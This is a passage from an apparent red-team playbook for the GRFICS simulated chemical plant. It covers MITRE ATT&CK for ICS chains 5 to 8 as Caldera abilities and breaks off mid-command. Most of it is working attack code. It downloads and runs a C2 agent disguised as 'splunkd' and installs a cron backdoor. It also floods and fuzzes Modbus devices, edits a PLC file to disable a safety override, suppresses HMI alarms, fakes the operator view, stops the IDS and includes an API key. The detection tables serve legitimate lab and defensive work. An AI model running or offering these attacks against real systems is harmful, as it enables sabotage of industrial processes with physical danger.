### Chain 5: Engineering Workstation Pivot with Lateral Tool Transfer

**Adversary Narrative**: A nation-state actor gains access to the Engineering Workstation via its internet-accessible noVNC interface, then uses it as a trusted pivot point. Since the EWS is on the ICS network, Modbus writes from its IP (192.168.95.5) are indistinguishable from legitimate engineering activity. The attacker transfers Modbus tooling laterally and manipulates I/O images from a trusted source.

**Kill Chain**: Internet-accessible device -> External remote service (VNC) -> CLI access -> Script execution -> Lateral tool transfer -> I/O image collection -> I/O manipulation from trusted host -> Process impact

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Internet Accessible Device | T0883 | Initial Access | Identify EWS noVNC at `http://<host>:6080` exposed on management network | Discover internet-facing ICS engineering asset |
| 2 | External Remote Services | T0822 | Initial Access | Connect to EWS via noVNC (`http://192.168.95.5:6080`) | Interactive desktop session on EWS |
| 3 | Remote Services | T0886 | Lateral Movement | Deploy Caldera Sandcat agent on EWS from VNC session | C2 channel from ICS network host |
| 4 | Command-Line Interface | T0807 | Execution | Open terminal, run `ip a`, `netstat -ant`, `route -n` | Enumerate network from ICS-internal position |
| 5 | Network Connection Enumeration | T0840 | Discovery | `ss -tunap \| grep 502` and `nmap -sT -p502 192.168.95.0/24` | Discover active Modbus connections and servers |
| 6 | Lateral Tool Transfer | T0867 | Lateral Movement | Download `modbus_cli` from Caldera server to EWS | Attack tooling now on trusted ICS host |
| 7 | Scripting | T0853 | Execution | Write Python script to automate Modbus reads across all devices | Automated process intelligence gathering |
| 8 | I/O Image | T0877 | Collection | Read PLC I/O map: `./modbus_cli 192.168.95.2 read_ir 100 13` | Full snapshot of PLC input/output register state |
| 9 | Data from Local System | T0893 | Collection | `find / -name "*.st" -o -name "*.xml" 2>/dev/null` on EWS | Discover PLC project files on engineering workstation |
| 10 | Manipulate I/O Image | T0835 | Inhibit Response | Write false values to PLC I/O registers from trusted EWS IP | PLC acts on corrupted I/O data; origin appears legitimate |
| 11 | Standard Application Layer Protocol | T0869 | C2 | Agent beacons over HTTP to `192.168.90.250:8888` via router | C2 traffic blends with normal HTTP |
| 12 | Commonly Used Port | T0885 | C2 | C2 on port 8888 (HTTP); Modbus on port 502 | All attack traffic uses standard ports |

#### Caldera Implementation

**Step 1: Deploy agent on EWS**

Access the EWS via noVNC at `http://localhost:6080`. Open a terminal as `engineer` and run:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
nohup ./splunkd -server $server -group ews -v &
```

**Step 2: Create custom abilities**

**Ability: Network Connection Enumeration from EWS**

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000001
  name: ICS Network Connection Enumeration
  description: >
    Enumerate active Modbus TCP connections and scan for all Modbus
    servers on the ICS network from the trusted EWS position.
  tactic: discovery
  technique_id: T0840
  technique_name: Network Connection Enumeration
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== Active connections ===" &&
      ss -tunap 2>/dev/null | grep -E '502|8080|55555' &&
      echo "=== Modbus hosts on ICS net ===" &&
      for ip in $(seq 1 254); do
        (echo > /dev/tcp/192.168.95.$ip/502) 2>/dev/null &&
        echo "MODBUS_HOST: 192.168.95.$ip";
      done
    timeout: 120
```

**Ability: Lateral Tool Transfer**

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000002
  name: Lateral Transfer - Modbus CLI to EWS
  description: >
    Download the modbus_cli binary from Caldera server to the
    engineering workstation, establishing attack capability on a
    trusted ICS network host.
  tactic: lateral-movement
  technique_id: T0867
  technique_name: Lateral Tool Transfer
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -X POST -H "file:modbus_cli" -H "platform:linux"
      http://192.168.90.250:8888/file/download -o ./modbus_cli &&
      chmod +x ./modbus_cli &&
      echo "TOOL_TRANSFERRED: modbus_cli" &&
      ls -la ./modbus_cli
    timeout: 60
```

**Ability: Automated I/O Image Collection via Script**

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000003
  name: Scripted Automated I/O Image Collection
  description: >
    Python script that continuously reads all I/O registers from
    the PLC and simulation devices every 5 seconds, building a
    process historian-style dataset for attacker intelligence.
  tactic: collection
  technique_id: T0877
  technique_name: I/O Image
  executors:
  - platform: linux
    name: sh
    command: >
      python3 -c "
      import subprocess, time, json
      targets = [
        ('192.168.95.2', 'PLC', 'read_ir', '100', '13'),
        ('192.168.95.14', 'Tank', 'read_ir', '1', '2'),
        ('192.168.95.10', 'Feed1', 'read_hr', '1', '1'),
        ('192.168.95.12', 'Purge', 'read_hr', '1', '1'),
      ]
      for cycle in range(5):
          ts = time.strftime('%H:%M:%S')
          for ip, name, cmd, start, count in targets:
              r = subprocess.run(['./modbus_cli', ip, '--port', '502', cmd, start, count],
                  capture_output=True, text=True, timeout=5)
              print(f'[{ts}] {name}({ip}): {r.stdout.strip()}')
          time.sleep(5)
      "
    timeout: 120
```

**Ability: Manipulate I/O Image from Trusted Source**

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000004
  name: Manipulate PLC I/O Image from Trusted EWS
  description: >
    Write corrupted values to the PLC's input registers from the
    EWS IP address (192.168.95.5). Since the EWS is a legitimate
    ICS host, Modbus writes from this IP are difficult to
    distinguish from normal engineering operations.
  tactic: inhibit-response-function
  technique_id: T0835
  technique_name: Manipulate I/O Image
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 30); do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
        sleep 0.2;
      done
    payloads:
    - modbus_cli
```

**Ability: Harvest Local Project Files**

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000005
  name: Harvest PLC Project Files from EWS
  description: >
    Search the engineering workstation filesystem for PLC project
    files (Structured Text, XML), configuration, and credentials.
  tactic: collection
  technique_id: T0893
  technique_name: Data from Local System
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== ST files ===" &&
      find /home/engineer -name "*.st" -exec echo {} \; 2>/dev/null &&
      echo "=== XML project files ===" &&
      find /home/engineer -name "*.xml" -exec echo {} \; 2>/dev/null &&
      echo "=== Bash history ===" &&
      cat /home/engineer/.bash_history 2>/dev/null | tail -20 &&
      echo "=== Firefox bookmarks (URLs) ===" &&
      strings /home/engineer/.mozilla/firefox/*/places.sqlite 2>/dev/null |
      grep -oP 'https?://[^\s"]+' | sort -u | head -10
    timeout: 30
```

**Step 3: Adversary Profile**

```yaml
name: Engineering Workstation Pivot Adversary
description: >
  Compromises the EWS via external remote services, transfers Modbus
  attack tooling laterally, then manipulates PLC I/O from a trusted
  ICS network position to evade source-IP-based detection rules.
adversary_id: cc005555-aaaa-bbbb-cccc-000000000005
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- e5f6a7b8-5555-5555-5555-000000000001  # Network enumeration
- e5f6a7b8-5555-5555-5555-000000000005  # Harvest local files
- e5f6a7b8-5555-5555-5555-000000000002  # Transfer Modbus tool
- e5f6a7b8-5555-5555-5555-000000000003  # Automated I/O collection
- e5f6a7b8-5555-5555-5555-000000000004  # Manipulate I/O from trusted source
```

**Step 4: Operation via REST API**

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "EWS-Pivot-Attack-001",
    "adversary": {"adversary_id": "cc005555-aaaa-bbbb-cccc-000000000005"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "ews",
    "auto_close": false,
    "autonomous": 1
  }'
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| VNC access to EWS | EWS auth.log (`shared_logs/ews/auth.log`) | VNC session login events | DC0067 (Logon Session Creation) |
| Agent download (curl) | EWS syslog, audit (`shared_logs/ews/audit/*`) | Process execution: curl to external IP | DC0032 (Process Creation) |
| Network scan from EWS | Router Suricata (`shared_logs/router/eve.json`) | TCP SYN scan on port 502 from 192.168.95.5 | DC0078 (Network Traffic Flow) |
| Tool transfer | EWS audit, syslog | File creation: `modbus_cli` binary appears on EWS | DC0039 (File Creation) |
| I/O reads from EWS | Router Suricata | Modbus FC=0x04 from .5 to .2 (abnormal source for I/O reads) | DC0085 (Network Traffic Content) |
| I/O manipulation | Router Suricata, PLC logs | Modbus FC=0x06 writes from .5 (EWS IP normally doesn't write Modbus) | DC0082 (Network Connection Creation) |
| Process alarms | Simulation alarms (`shared_logs/simulation/process_alarms`) | Pressure deviations from manipulated I/O | DC0109 (Process/Event Alarm) |
| HTTP C2 beaconing | Router Suricata | Periodic HTTP POST from 192.168.95.5 to 192.168.90.250:8888 | DC0078 (Network Traffic Flow) |

#### Variation: Stealthier -- Project File Infection

Instead of direct Modbus writes, modify the PLC project files on the EWS disk (e.g., `attack.st`), then wait for the engineer to upload the infected project naturally:

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000006
  name: Infect PLC Project File on EWS
  description: >
    Modify the chemical.st project file on the EWS to include
    malicious logic. When the engineer next uploads to the PLC,
    the infected program replaces the legitimate one.
  tactic: persistence
  technique_id: T0873
  technique_name: Project File Infection
  executors:
  - platform: linux
    name: sh
    command: >
      cp /home/engineer/Desktop/chemical.st /tmp/backup_chemical.st &&
      sed -i 's/override_sp_real : REAL := 2900.0/override_sp_real : REAL := 99999.0/'
      /home/engineer/Desktop/chemical.st &&
      echo "Project file modified - safety override disabled"
    timeout: 15
```

#### Escalation: Deploy Persistent Backdoor on EWS

```yaml
- id: e5f6a7b8-5555-5555-5555-000000000007
  name: EWS Persistent Cron Backdoor
  description: Cron job re-establishes C2 agent every 5 minutes
  tactic: persistence
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      (crontab -l 2>/dev/null; echo "*/5 * * * * cd /tmp &&
      curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux'
      http://192.168.90.250:8888/file/download -o .svc &&
      chmod +x .svc && ./.svc -server http://192.168.90.250:8888
      -group ews &") | crontab - &&
      echo "PERSISTENCE_INSTALLED"
    timeout: 15
```

#### Assumptions

- EWS noVNC is accessible from the attacker's position (via host port 6080 or admin network)
- The `engineer` user has filesystem access to PLC project files
- The EWS can reach both the ICS network (192.168.95.0/24) and the Caldera server (192.168.90.250) via routing through the router
- No application whitelisting on the EWS

---

### Chain 6: Rogue Modbus Master + Brute Force I/O Disruption

**Adversary Narrative**: A destructive attacker establishes themselves as an unauthorized Modbus master device on the ICS network. Rather than precision manipulation, they employ brute-force I/O techniques -- flooding Modbus devices with rapid, random register writes to destabilize the process and overwhelm the PLC's ability to maintain control. This creates chaotic, unpredictable plant behavior.

**Kill Chain**: DMZ foothold -> Network discovery -> Rogue master establishment -> Parameter modification -> Brute force I/O flooding -> Denial of service -> Loss of availability

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Remote System Discovery | T0846 | Discovery | `nmap -sT -p 502 192.168.95.0/24` | Discover all 7 Modbus endpoints |
| 2 | Network Connection Enumeration | T0840 | Discovery | `tcpdump -i eth0 -c 100 port 502` to observe PLC polling | Identify PLC master (192.168.95.2) polling frequency (100ms) |
| 3 | Detect Operating Mode | T0868 | Collection | Read PLC coils to determine run/stop state | Confirm PLC is in RUN mode before attack |
| 4 | Rogue Master | T0848 | Initial Access | Begin sending Modbus writes to devices as unauthorized master | Attacker acts as second Modbus master alongside PLC |
| 5 | Modify Parameter | T0836 | Impair Process Control | Write extreme setpoints to valve devices | Force valves to unsafe positions |
| 6 | Brute Force I/O | T0806 | Impair Process Control | `modbus_cli fuzz_r` on all 4 writable devices simultaneously | Random register values cause erratic process behavior |
| 7 | Denial of Service | T0814 | Inhibit Response | Flood all Modbus servers with rapid requests | Simulation I/O devices overwhelmed, PLC reads stale/wrong values |
| 8 | Loss of Availability | T0826 | Impact | Sustained flooding prevents PLC from maintaining process | Chemical plant effectively offline |
| 9 | Loss of Productivity and Revenue | T0828 | Impact | Process throughput drops to zero | Plant shutdown due to uncontrolled conditions |

#### Caldera Implementation

**Ability: Detect PLC Operating Mode**

```yaml
- id: f6a7b8c9-6666-6666-6666-000000000001
  name: Modbus - Detect PLC Operating Mode
  description: >
    Read the PLC's run_bit coil and holding registers to determine
    if the PLC is in RUN mode. The run_bit at QX5.0 maps to Modbus
    coil 40. Also read setpoint registers MW0-MW4.
  tactic: collection
  technique_id: T0868
  technique_name: Detect Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== PLC Run State (coils 0-50) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 &&
      echo "=== Current Setpoints (HR 0-10) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_hr 0 10 &&
      echo "PLC_MODE: RUN"
    payloads:
    - modbus_cli
```

**Ability: Modify Process Parameters**

```yaml
- id: f6a7b8c9-6666-6666-6666-000000000002
  name: Modbus - Modify Critical Process Parameters
  description: >
    Write extreme setpoint values directly to simulation devices:
    Feed 1 and Feed 2 fully open, Purge and Product fully closed.
    This overrides the PLC's commanded values at the field device level.
  tactic: impair-process-control
  technique_id: T0836
  technique_name: Modify Parameter
  executors:
  - platform: linux
    name: sh
    command: >
      echo "Modifying process parameters as rogue master..." &&
      ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 &&
      ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 &&
      ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 &&
      ./modbus_cli 192.168.95.13 --port 502 write_r 1 0 &&
      echo "All valve setpoints overridden"
    payloads:
    - modbus_cli
```

**Ability: Brute Force I/O**

```yaml
- id: f6a7b8c9-6666-6666-6666-000000000003
  name: Modbus - Brute Force I/O on All Devices
  description: >
    Simultaneously fuzz all holding registers on the 4 writable
    Modbus devices. Each device receives 200 random register writes
    with 50ms intervals, creating chaotic, unpredictable valve behavior
    that the PLC cannot compensate for.
  tactic: impair-process-control
  technique_id: T0806
  technique_name: Brute Force I/O
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.10 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID1=$!;
      ./modbus_cli 192.168.95.11 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID2=$!;
      ./modbus_cli 192.168.95.12 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID3=$!;
      ./modbus_cli 192.168.95.13 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID4=$!;
      wait $PID1 $PID2 $PID3 $PID4;
      echo "BRUTE_FORCE_IO_COMPLETE"
    payloads:
    - modbus_cli
```

**Ability: Modbus Denial of Service Flood**

```yaml
- id: f6a7b8c9-6666-6666-6666-000000000004
  name: Modbus - Denial of Service Flood
  description: >
    Flood all Modbus servers with rapid read requests to saturate
    the TCP connection pool. Each device gets 1000 read requests
    with no delay, competing with the PLC's legitimate 100ms polling.
  tactic: inhibit-response-function
  technique_id: T0814
  technique_name: Denial of Service
  executors:
  - platform: linux
    name: sh
    command: >
      flood_device() {
        for i in $(seq 1 1000); do
          ./modbus_cli $1 --port 502 read_ir 1 2 2>/dev/null;
        done
      };
      flood_device 192.168.95.10 &
      flood_device 192.168.95.11 &
      flood_device 192.168.95.12 &
      flood_device 192.168.95.13 &
      flood_device 192.168.95.14 &
      flood_device 192.168.95.15 &
      wait;
      echo "DOS_FLOOD_COMPLETE"
    payloads:
    - modbus_cli
```

**Step 3: Adversary Profile**

```yaml
name: Rogue Modbus Master Adversary
description: >
  Destructive attacker acting as unauthorized Modbus master.
  Employs brute-force I/O to create chaotic plant behavior,
  then floods devices to deny PLC control entirely.
adversary_id: cc006666-aaaa-bbbb-cccc-000000000006
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network scan (from Chain 1)
- f6a7b8c9-6666-6666-6666-000000000001  # Detect operating mode
- a1b2c3d4-1111-1111-1111-000000000003  # Enumerate all I/O (from Chain 1)
- f6a7b8c9-6666-6666-6666-000000000002  # Modify parameters
- f6a7b8c9-6666-6666-6666-000000000003  # Brute force I/O
- f6a7b8c9-6666-6666-6666-000000000004  # Denial of service flood
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Network scan | Suricata eve.json | SYN scan on port 502 | DC0078 (Network Traffic Flow) |
| PLC register read | Suricata | Modbus FC=0x01 (Read Coils) from 192.168.90.6 to 192.168.95.2 | DC0085 (Network Traffic Content) |
| Rogue parameter writes | Suricata | Modbus FC=0x06 writes from non-PLC source to .10-.13 | DC0082 (Network Connection Creation) |
| Brute force I/O | Suricata, Simulation supervisor | Burst of 800+ Modbus writes in <30 seconds; random register values | DC0085 (Network Traffic Content) |
| DoS flood | Suricata | >1000 Modbus reads/sec from single source; connection timeouts | DC0078 (Network Traffic Flow) |
| Process chaos | Simulation process_alarms, supervisor | Valve positions oscillating wildly, pressure/level unstable | DC0109 (Process/Event Alarm) |
| PLC stale reads | PLC plc_app logs | PLC Modbus master timeouts or read failures | DC0108 (Device Alarm) |

#### Variation: Targeted Coil Fuzzing

Instead of register fuzzing, fuzz the run_bit coil on the PLC, creating intermittent emergency shutdowns:

```yaml
- id: f6a7b8c9-6666-6666-6666-000000000005
  name: Modbus - Fuzz PLC Run Bit Coil
  description: Rapidly toggle the PLC run_bit coil causing cyclic E-stops
  tactic: impair-process-control
  technique_id: T0806
  technique_name: Brute Force I/O
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.2 --port 502 fuzz_c 40 1 100 --wait 0.5
    payloads:
    - modbus_cli
```

#### Escalation: Simultaneous Rogue Master + Sensor Spoofing

Combine brute force writes with spoofed sensor values on Tank (.14) to mask the chaos from the PLC's perspective, delaying any automated safety response.

#### Assumptions

- Kali agent has network access to ICS subnet via router (default FORWARD ACCEPT)
- Modbus TCP has no authentication (protocol design limitation)
- `modbus_cli fuzz_r` binary is available on the Kali agent via Caldera payload delivery
- Simulation Modbus devices accept writes from any source IP

---

### Chain 7: SCADA HMI Deep Compromise -- View Manipulation + Alarm Tampering

**Adversary Narrative**: An attacker targeting operator trust. After compromising the SCADA-LTS HMI with default credentials, they use the application's REST API to exfiltrate operational data, modify graphical views to display false-normal values, suppress alarm configurations, and ultimately blind operators while the process is being attacked through a separate Modbus channel.

**Kill Chain**: HMI web login -> API-based recon -> Operational data theft -> Alarm setting modification -> View manipulation -> Simultaneous process attack -> Operator blindness

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Default Credentials | T0812 | Lateral Movement | Login to SCADA-LTS with `admin:admin` | Full administrative HMI access |
| 2 | Graphical User Interface | T0823 | Execution | Navigate SCADA-LTS web UI to identify views and data sources | Understand operator's visual display |
| 3 | Execution through API | T0871 | Execution | Use SCADA-LTS REST API to enumerate data sources and points | Programmatic access to all process data |
| 4 | Theft of Operational Information | T0882 | Impact | Export all process variable values, trends, and configurations | Full operational intelligence exfiltrated |
| 5 | Automated Collection | T0802 | Collection | Script continuous API polling to build attacker-side historian | Real-time shadow copy of process data |
| 6 | Modify Alarm Settings | T0838 | Inhibit Response | Raise alarm thresholds to extremes via SCADA-LTS API | Alarms will not trigger even during dangerous conditions |
| 7 | Alarm Suppression | T0878 | Inhibit Response | Disable alarm notifications in SCADA-LTS event handlers | No alerts reach operators |
| 8 | Manipulation of View | T0832 | Impact | Modify SCADA-LTS graphical view to show static "normal" values | Operators see false-normal display |
| 9 | Denial of View | T0815 | Impact | Corrupt or replace the HMI dashboard to prevent real monitoring | Complete operator blindness |

#### Caldera Implementation

**Ability: SCADA-LTS API Enumeration**

```yaml
- id: a7b8c9d0-7777-7777-7777-000000000001
  name: SCADA-LTS - API Data Source Enumeration
  description: >
    Use SCADA-LTS REST API to enumerate all configured Modbus data
    sources, data points, graphical views, and alarm configurations.
  tactic: execution
  technique_id: T0871
  technique_name: Execution through API
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      curl -s -c /tmp/hmi.jar -X POST "$HMI/login.htm"
      -d "username=admin&password=admin" -L -o /dev/null &&
      echo "=== Data Sources ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/datasources" 2>/dev/null &&
      echo "" && echo "=== Data Points ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/datapoints" 2>/dev/null &&
      echo "" && echo "=== Views ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/views" 2>/dev/null &&
      echo "" && echo "=== Users ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/users" 2>/dev/null
    timeout: 30
```

**Ability: Automated Operational Data Collection**

```yaml
- id: a7b8c9d0-7777-7777-7777-000000000002
  name: SCADA-LTS - Automated Process Data Theft
  description: >
    Continuously poll SCADA-LTS data point values every 10 seconds
    for 2 minutes, exfiltrating real-time process data.
  tactic: collection
  technique_id: T0802
  technique_name: Automated Collection
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      for cycle in $(seq 1 12); do
        echo "[Cycle $cycle] $(date +%H:%M:%S)" &&
        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null |
        python3 -m json.tool 2>/dev/null || echo "polling..." ;
        sleep 10;
      done
    timeout: 150
```

**Ability: Modify Alarm Thresholds**

```yaml
- id: a7b8c9d0-7777-7777-7777-000000000003
  name: SCADA-LTS - Raise Alarm Thresholds to Disable Alerts
  description: >
    Use SCADA-LTS API to modify alarm settings on pressure and
    level data points, raising thresholds so high that no alarm
    will ever trigger during the attack.
  tactic: inhibit-response-function
  technique_id: T0838
  technique_name: Modify Alarm Settings
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/event-detectors"
      -H "Content-Type: application/json"
      -d '{"highLimit": 999999, "lowLimit": -999999, "alarmLevel": "NONE"}'
      2>/dev/null &&
      echo "ALARM_THRESHOLDS_RAISED" &&
      curl -s -b /tmp/hmi.jar -X POST "$HMI/api/event-handlers/disable-all"
      2>/dev/null &&
      echo "ALARM_HANDLERS_DISABLED"
    timeout: 30
```

**Ability: Manipulate SCADA View**

```yaml
- id: a7b8c9d0-7777-7777-7777-000000000004
  name: SCADA-LTS - Manipulate Operator View
  description: >
    Modify the TenEastView1 graphical view in SCADA-LTS to display
    static "normal" values by changing JavaScript formatters in the
    ScriptComponents to return hardcoded safe values instead of live data.
  tactic: impact
  technique_id: T0832
  technique_name: Manipulation of View
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/views" -o /tmp/views.json &&
      echo "Current views captured." &&
      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/views/1"
      -H "Content-Type: application/json"
      -d '{"components":[{"script":"return \"2450.0 kPa\""},
           {"script":"return \"65.0%\""},
           {"script":"return \"NORMAL\""}]}'
      2>/dev/null &&
      echo "VIEW_MANIPULATED: Operators now see false-normal values"
    timeout: 30
```

**Step 3: Adversary Profile**

```yaml
name: HMI View Manipulation and Alarm Defeat Adversary
description: >
  APT-style operator deception chain. Compromises SCADA-LTS HMI,
  exfiltrates operational data, disables alarms, and manipulates
  the graphical view to show false-normal values while the process
  is under attack.
adversary_id: cc007777-aaaa-bbbb-cccc-000000000007
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login (from Chain 3)
- a7b8c9d0-7777-7777-7777-000000000001  # API enumeration
- a7b8c9d0-7777-7777-7777-000000000002  # Automated data collection
- a7b8c9d0-7777-7777-7777-000000000003  # Disable alarms
- a7b8c9d0-7777-7777-7777-000000000004  # Manipulate view
- a1b2c3d4-1111-1111-1111-000000000004  # Close purge (from Chain 1)
- a1b2c3d4-1111-1111-1111-000000000005  # Open feed (from Chain 1)
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| HMI login | HMI Catalina (`shared_logs/hmi/catalina`) | POST /login.htm from attacker IP | DC0067 (Logon Session Creation) |
| API calls | HMI Catalina access log | GET/PUT /api/* requests from non-operator IP | DC0038 (Application Log Content) |
| Alarm modification | HMI Catalina, supervisor | PUT /api/event-detectors, config change | DC0061 (File Modification) |
| View manipulation | HMI Catalina | PUT /api/views/1 modifying display components | DC0038 (Application Log Content) |
| Simultaneous Modbus attack | Router Suricata | FC=0x06 writes coinciding with HMI API tampering | DC0085 (Network Traffic Content) |
| No alarm triggers | ABSENCE in HMI logs | Expected alarms do NOT appear despite process deviations | DC0109 (Process/Event Alarm) |

#### Variation: SQL Injection on SCADA-LTS MariaDB

If API-based modification fails, directly manipulate the SCADA-LTS MariaDB database through the Tomcat JDBC connection to modify view configurations at the database level.

#### Escalation: Change HMI Admin Password

```yaml
- id: a7b8c9d0-7777-7777-7777-000000000005
  name: SCADA-LTS - Lock Out Legitimate Operators
  description: Change the admin password to lock operators out of HMI
  tactic: inhibit-response-function
  technique_id: T0892
  technique_name: Change Credential
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/hmi.jar -X PUT
      "http://192.168.90.107:8080/ScadaBR/api/users/admin"
      -H "Content-Type: application/json"
      -d '{"password":"pwned2024"}' &&
      echo "ADMIN_PASSWORD_CHANGED"
    timeout: 15
```

#### Assumptions

- SCADA-LTS REST API is accessible with admin credentials at `admin:admin`
- SCADA-LTS has a view named `TenEastView1` with ScriptComponent data points
- API endpoints for views, data sources, event detectors, and users exist (SCADA-LTS 2.7.x provides REST API)
- No API rate limiting or additional authentication beyond session cookies

---

### Chain 8: Network Infrastructure Sabotage -- Router Attack + Communication Disruption

**Adversary Narrative**: A saboteur targets the ICS network infrastructure itself. By compromising the router/firewall device, they can block Modbus command messages from the PLC to field devices, block reporting messages from devices back to the PLC, disable the IDS to cover their tracks, and ultimately isolate ICS components from each other, causing a complete denial of control.

**Kill Chain**: Router web login -> Firewall recon -> IDS shutdown -> Log cleanup -> Block PLC commands -> Block device responses -> Complete communication isolation -> Denial of control

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Default Credentials | T0812 | Lateral Movement | Login to router Flask UI at `192.168.90.200:5000` with `admin:password` | Full firewall management access |
| 2 | Graphical User Interface | T0823 | Execution | Navigate router web UI to view current firewall rules and IDS status | Understand current firewall state |
| 3 | Service Stop | T0881 | Inhibit Response | Kill Suricata IDS process via router compromise | Remove network-based detection capability |
| 4 | Indicator Removal on Host | T0872 | Evasion | Clear Suricata eve.json and netfilter logs | Destroy evidence of prior reconnaissance |
| 5 | Block Command Message | T0803 | Inhibit Response | iptables rule: DROP Modbus TCP from PLC (.2) to simulation (.10-.15) on port 502 | PLC can no longer send commands to field devices |
| 6 | Block Reporting Message | T0804 | Inhibit Response | iptables rule: DROP Modbus TCP from simulation (.10-.15) to PLC (.2) on port 502 | PLC receives no sensor data from field devices |
| 7 | Denial of Control | T0813 | Impact | PLC completely isolated from its I/O | Process runs uncontrolled |
| 8 | Device Restart/Shutdown | T0816 | Inhibit Response | Restart router to flush routing table and apply persistent rules | Temporary network disruption across zones |

#### Caldera Implementation

**Ability: Router Login and Recon**

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000001
  name: Router - Default Credential Login and Recon
  description: >
    Login to the router's Flask firewall management UI with default
    credentials. Enumerate current iptables rules and Suricata status.
  tactic: lateral-movement
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/router.jar
      -X POST "http://192.168.90.200:5000/login"
      -d "username=admin&password=password"
      -L -o /tmp/router_home.html -w "%{http_code}" &&
      echo "=== Current Firewall Rules ===" &&
      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/firewall" |
      grep -oP 'rule.*?</tr>' | head -20 &&
      echo "=== IDS Status ===" &&
      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/ids" |
      grep -oP 'alert.*?</td>' | head -10 &&
      echo "ROUTER_ACCESS: SUCCESS"
    timeout: 30
```

**Ability: Stop Suricata IDS**

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000002
  name: Router - Stop Suricata IDS
  description: >
    Disable the Suricata IDS running on the router to prevent
    detection of subsequent Modbus manipulation attacks. Uses the
    router's web API or direct process kill if API is available.
  tactic: inhibit-response-function
  technique_id: T0881
  technique_name: Service Stop
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
      -X POST "http://192.168.90.200:5000/ids/stop" 2>/dev/null &&
      echo "IDS_STOPPED" ||
      echo "IDS stop via API failed - attempting alternate method"
    timeout: 15
```

**Ability: Clear IDS and Firewall Logs**

```yaml
- id: b8c9d0e1-8888-8888-8888-000000000003
  name: Router - Clear Evidence Logs
  description: >
    Clear Suricata eve.json alerts and netfilter logs to remove
    evidence of prior reconnaissance activities.
  tactic: evasion
  technique_id: T0872
  technique_name: Indicator Removal on Host
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
